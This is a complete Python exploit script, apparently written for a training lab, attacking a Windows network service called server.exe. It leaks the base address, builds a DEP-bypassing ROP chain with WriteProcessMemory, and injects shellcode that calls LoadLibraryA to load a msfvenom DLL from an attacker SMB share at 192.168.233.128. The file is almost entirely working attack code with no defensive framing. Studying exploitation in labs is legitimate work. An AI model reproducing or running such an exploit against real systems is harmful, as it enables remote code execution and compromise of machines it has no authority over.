#!/usr/bin/python3
from pwn import remote, p32, asm

payload  = b""
payload += b"mysecret"
payload += p32(0)
payload += p32(1)
payload += b"server.exe\x00\x00"
payload += p32(0)
payload += b"L0L\x00"

shell = remote("Windows", 12345)
shell.sendline(payload)

binary_base = int(shell.recv(), 16)
shell.close()

"""
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,               (-1)
  [in]  LPVOID  lpBaseAddress,          (&Executable)
  [in]  LPCVOID lpBuffer,               (-)
  [in]  SIZE_T  nSize,                  (-)
  [out] SIZE_T  *lpNumberOfBytesWritten (&Writable)
);
"""

ret =  b""
ret += p32(binary_base + 0x2805) # push esp; xor eax, eax; pop ebx; pop esi; ret;
ret += p32(0x41414141)           # padding for pop
ret += p32(binary_base + 0x17ee) # mov eax, ebx; ret;
ret += p32(binary_base + 0x2633) # pop ebx; ret;
ret += p32(0xfffffc08)           # 0x0 - 1016
ret += p32(binary_base + 0x17fb) # add eax, ebx; xchg edx, ebx; cmp ebx, eax; ret;
ret += p32(binary_base + 0x69ce) # xchg esp, eax; ret;

rop =  b""
rop += p32(binary_base + 0x2805) # push esp; xor eax, eax; pop ebx; pop esi; ret;
rop += p32(0x41414141)           # padding for pop
rop += p32(binary_base + 0x17ee) # mov eax, ebx; ret;
rop += p32(binary_base + 0x109a) # add esp, 0x1c; ret;
rop += p32(binary_base + 0xf238) # WriteProcessMemory()
rop += p32(binary_base + 0x95f0) # Executable
rop += p32(0xffffffff)           # Current Process (-1)
rop += p32(binary_base + 0x9429) # Executable
rop += p32(0x41414141)           # lpBuffer
rop += p32(0x41414141)           # nSize
rop += p32(binary_base + 0xa068) # Writable
rop += p32(binary_base + 0x5ed1) # add eax, 4; pop ebx; ret;
rop += p32(0x41414141)           # padding for pop
rop += p32(binary_base + 0x5ed1) # add eax, 4; pop ebx; ret;
rop += p32(0x41414141)           # padding for pop
rop += p32(binary_base + 0x5ed1) # add eax, 4; pop ebx; ret;
rop += p32(0x41414141)           # padding for pop
rop += p32(binary_base + 0x17f1) # mov ebx, eax; ret;
rop += p32(binary_base + 0x90a5) # mov eax, dword ptr [eax]; ret;
rop += p32(binary_base + 0x90a5) # mov eax, dword ptr [eax]; ret;
rop += p32(binary_base + 0x17fa) # mov dword ptr [ebx], eax; ret;
rop += p32(binary_base + 0x17ee) # mov eax, ebx; ret;
rop += p32(binary_base + 0x5ed1) # add eax, 4; pop ebx; ret;
rop += p32(0x41414141)           # padding for pop
rop += p32(binary_base + 0x5ed1) # add eax, 4; pop ebx; ret;
rop += p32(0x41414141)           # padding for pop
rop += p32(binary_base + 0x5ed1) # add eax, 4; pop ebx; ret;
rop += p32(0x41414141)           # padding for pop
rop += p32(binary_base + 0x5ed1) # add eax, 4; pop ebx; ret;
rop += p32(0xffffffff)           # 0x0 - 0x1
rop += p32(binary_base + 0x17f4) # mov ecx, eax; ret;
rop += p32(binary_base + 0x17fb) # add eax, ebx; xchg edx, ebx; cmp ebx, eax; ret;
rop += p32(binary_base + 0x8ca8) # mov dword ptr [ecx], eax; add esp, 0x34; mov eax, 1; pop ebx; pop esi; ret;
rop += p32(0x41414141)           # padding for pop
rop += p32(0x41414141)           # padding for pop
rop += p32(0x41414141) * 13      # padding for add
rop += p32(binary_base + 0x3534) # mov eax, ecx; ret;
rop += p32(binary_base + 0x5ed1) # add eax, 4; pop ebx; ret;
rop += p32(0x41414141)           # padding for pop
rop += p32(binary_base + 0x17f1) # mov ebx, eax; ret;
rop += p32(binary_base + 0x3567) # pop eax; pop ecx; ret;
rop += p32(0xfffffcfc)           # 0x0 - 300
rop += p32(0x41414141)           # padding for pop
rop += p32(binary_base + 0x14da) # neg eax; ret;
rop += p32(binary_base + 0x17fa) # mov dword ptr [ebx], eax; ret;
rop += p32(binary_base + 0x17ee) # mov eax, ebx; ret;
rop += p32(binary_base + 0x2633) # pop ebx; ret;
rop += p32(0xffffffec)           # 0x0 - 20
rop += p32(binary_base + 0x17fb) # add eax, ebx; xchg edx, ebx; cmp ebx, eax; ret;
rop += p32(binary_base + 0x69ce) # xchg esp, eax; ret;

"""
HMODULE LoadLibraryA(
  [in] LPCSTR lpLibFileName
);
"""

# msfvenom -p windows/exec CMD=calc.exe -f dll -o shell.dll
smb = b"\\\\192.168.233.128\\kali\\shell.dll"[::-1].hex()

shellcode  = b""
shellcode += asm("xor ebx, ebx")                                 # convert $ebx to 0x0
shellcode += asm("push ebx")                                     # push string terminator (\x00)

for i in range(0, len(smb), 8):
     shellcode += asm("push 0x" + smb[i:8+i])                    # push the smb string in dwords to $esp

shellcode += asm("mov ebx, esp")                                 # save the smb string in $ebx
shellcode += asm("push ebx")                                     # push ptr to the string
shellcode += asm(f"mov eax, dword ptr [{binary_base + 0xf20c}]") # save LoadLibraryA() in $eax
shellcode += asm("call eax")                                     # call $eax with the smb string as argument

shellcode += b"C" * (510 - len(shellcode))

# !py mona pattern_offset eip
offset = 1012
junk = b"A" * (offset - len(rop + shellcode))

payload  = b""
payload += b"mysecret"
payload += p32(0)
payload += p32(8)
payload += p32(1999)
payload += rop
payload += junk
payload += shellcode
payload += ret
payload += b"D" * (1999 - len(payload))

shell = remote("Windows", 12345)
shell.send(payload)
